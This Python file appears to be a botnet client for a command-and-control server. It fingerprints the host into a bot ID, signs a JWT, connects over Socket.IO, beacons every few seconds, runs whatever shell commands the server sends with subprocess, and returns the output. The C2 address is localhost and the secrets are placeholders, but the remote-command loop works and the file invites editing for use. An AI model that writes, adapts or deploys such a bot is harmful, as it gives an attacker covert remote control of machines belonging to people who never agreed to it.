import socketio
import time
import subprocess
import jwt
import hashlib
import base64
import platform
import uuid
import os

# decrypt seed
def decrypt_seed():
    encrypted = "change-me"
    key = "change-me"
    data = base64.b64decode(encrypted)
    decrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data.decode('utf-8', errors='ignore')))
    return decrypted.strip()

# configuration (edit to however you like)
SECRET_SEED = decrypt_seed()
BOT_ID = hashlib.sha256(
    f"{platform.node()}|{':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 48, 8)])}".encode()
).hexdigest()[:32]

JWT_SECRET = hashlib.sha256(f"{SECRET_SEED}{BOT_ID[:16]}C2SALT2026".encode()).hexdigest()
C2_URL = "http://127.0.0.1:3000"

# command execution
def execute_command(cmd):
    try:
        print(f"executing: {cmd}")

        original_cmd = cmd
        # auto adjust command names for windows
        if os.name == 'nt':  # windows
            cmd_lower = cmd.lower().strip()
            if cmd_lower.startswith(('ls', 'll')):
                cmd = 'dir'
            elif cmd_lower == 'pwd':
                cmd = 'cd'
            elif cmd_lower.startswith('uname'):
                cmd = 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"'
            elif cmd_lower == 'ifconfig' or cmd_lower == 'ip a':
                cmd = 'ipconfig'

        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        
        output = (result.stdout + result.stderr).strip()[:3000]
        
        return {
            "command": original_cmd,
            "executed": cmd,
            "output": output or "no output",
            "exit_code": result.returncode,
            "timestamp": int(time.time()),
            "platform": platform.system()
        }
    except Exception as e:
        return {
            "command": original_cmd,
            "output": f"Error: {str(e)}",
            "exit_code": -1,
            "timestamp": int(time.time()),
            "platform": platform.system()
        }

def main():
    sio = socketio.Client(reconnection=True, reconnection_delay=3, reconnection_attempts=10)

    @sio.event
    def connect():
        print("connected via web socket.")

    @sio.event
    def commands(data):
        print(f"received {len(data)} command(s)")
        for cmd in data:
            if isinstance(cmd, str) and cmd.strip():
                result = execute_command(cmd)
                sio.emit('result', result)

    @sio.event
    def disconnect():
        print("disconnected from web socket.")

    token = jwt.encode({
        "botId": BOT_ID,
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400
    }, JWT_SECRET, algorithm="HS256")

    try:
        sio.connect(C2_URL, socketio_path='/ws', auth={"token": token, "botId": BOT_ID})
        
        while True:
            sio.emit('beacon', {})
            time.sleep(8)
    except Exception as e:
        print(f"[!] Connection Error: {e}")
        time.sleep(8)

if __name__ == "__main__":
    print(f"bot started | ID: {BOT_ID[:12]}... | platform: {platform.system()}")
    while True:
        try:
            main()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"unexpected error: {e}")
            time.sleep(10)